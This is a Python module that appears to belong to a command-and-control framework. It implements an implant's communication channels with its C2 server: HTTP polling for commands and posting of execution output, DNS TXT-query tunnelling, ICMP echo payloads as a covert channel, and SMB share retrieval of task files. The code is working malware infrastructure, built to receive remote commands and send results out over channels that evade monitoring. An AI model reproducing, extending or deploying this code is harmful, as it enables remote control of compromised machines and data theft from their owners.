"""
Agent.agent_comm.py

Provides implementations for different communication channels (HTTP, DNS, ICMP, SMB)
for interaction between agents and the C2 server.
Supports message sending, command polling, and task retrieval.
"""
#!/usr/bin/env python3

import json
import requests
import dns.message
import dns.query
from scapy.all import sr1
from scapy.layers.inet import IP, ICMP
from smb.SMBConnection import SMBConnection

class BaseComm:
    """
    Base communication class to define a common interface for all communication methods.
    """
    def send_message(self, message: str) -> str:
        """
        Sends a message using the specific communication method.
        Must be implemented by subclasses.

        Args:
            message (str): The message to send.
        Returns:
            str: The response message received.
        """
        raise NotImplementedError

# HTTP / HTTPS communication
class HTTPComm(BaseComm):
    """
    Handles communication over HTTP(S) with the C2 server.
    """
    def __init__(self, server_url: str):
        self.server_url = server_url.rstrip('/')

    def poll_commands(self, agent_id: str, auth_token: str):
        """
        Polls the C2 server for new commands.

        Args:
            agent_id (str): The unique identifier of the agent.
            auth_token (str): Authentication token.
        Returns:
            list: A list of received commands.
        """
        try:
            url = f"{self.server_url}/api/agent/commands"
            params = {"agent_id": agent_id, "auth_token": auth_token}
            response = requests.get(url, params=params)
            if response.status_code == 200:
                return response.json().get("commands", [])
            else:
                print("HTTP poll error: ", response.status_code, response.text)
        except Exception as e:
            print("HTTP poll error: ", e)
        return []

    def send_output(self, agent_id: str, auth_token: str, output: str) -> bool:
        """
        Sends command execution output to the C2 server.
        """
        try:
            url = f"{self.server_url}/api/agent/output"
            payload = {"agent_id": agent_id, "auth_token": auth_token, "output": output}
            response = requests.post(url, json=payload)
            return response.status_code == 200
        except Exception as e:
            print("HTTP send error: ", e)
        return False

    def send_message(self, message:str) -> str:
        try:
            url = f"{self.server_url}/api/agent/message"
            payload = {"message": message}
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                return response.json().get("response", "")
        except Exception as e:
            print("HTTP send error: ", e)
        return ""

class DNSComm(BaseComm):
    """
    Handles communication over DNS, typically using TXT records.
    """
    def __init__(self, dns_server_ip: str):
        self.dns_server_ip = dns_server_ip

    def send_message(self, message: str) -> str:
        """
        Sends a message by encoding it as a DNS query.
        """
        try:
            domain = f"{message}.agent.example.com"
            query = dns.message.make_query(domain, dns.rdatatype.TXT)
            response = dns.query.udp(query, self.dns_server_ip, timeout=2)
            for answer in response.answer:
                for item in answer.items:
                    if hasattr(item, "strings"):
                        return b" ".join(item.strings).decode()
        except Exception as e:
            print("DNS send_message error:", e)
        return ""

class ICMPComm(BaseComm):
    """
    Handles communication over ICMP by sending Echo Requests with payloads.
    """
    def __init__(self, target_ip: str):
        self.target_ip = target_ip

    def send_message(self, message: str) -> str:
        """
        Sends an ICMP Echo Request with a message payload.
        Requires administrative privileges.
        """
        try:
            pkt = IP(dst=self.target_ip) / ICMP() / message.encode()
            reply = sr1(pkt, timeout=2, verbose=0)
            if reply and reply.haslayer(ICMP):
                payload = reply.getlayer(ICMP).payload.load
                return payload.decode(errors="ignore")
        except Exception as e:
            print("ICMP send_message error:", e)
        return ""

class SMBComm(BaseComm):
    """
    Handles communication over SMB, typically using file-based message exchange.
    """
    def __init__(self, server_ip: str, server_name: str = "SMBSERVER"):
        self.server_ip = server_ip
        self.server_name = server_name

    def retrieve_task_file(self, share: str = "TASKS", filename: str = "task.txt", username: str = "", password: str = "") -> str:
        """
        Connects to the SMB server and retrieves a task file.
        """
        try:
            conn = SMBConnection(username, password, "agent", self.server_name, use_ntlm_v2=True)
            connected = conn.connect(self.server_ip, 445)
            if connected:
                with open("downloaded_task.txt", "wb") as file_obj:
                    conn.retrieveFile(share, filename, file_obj)
                with open("downloaded_task.txt", "r") as file_obj:
                    return file_obj.read()
        except Exception as e:
            print("SMB retrieve_task_file error:", e)
        return ""

    def send_message(self, message: str) -> str:
        """
        Not implemented for SMB since it primarily uses file-based tasking.
        """
        print("SMB send_message is not implemented as a direct message channel.")
        return ""
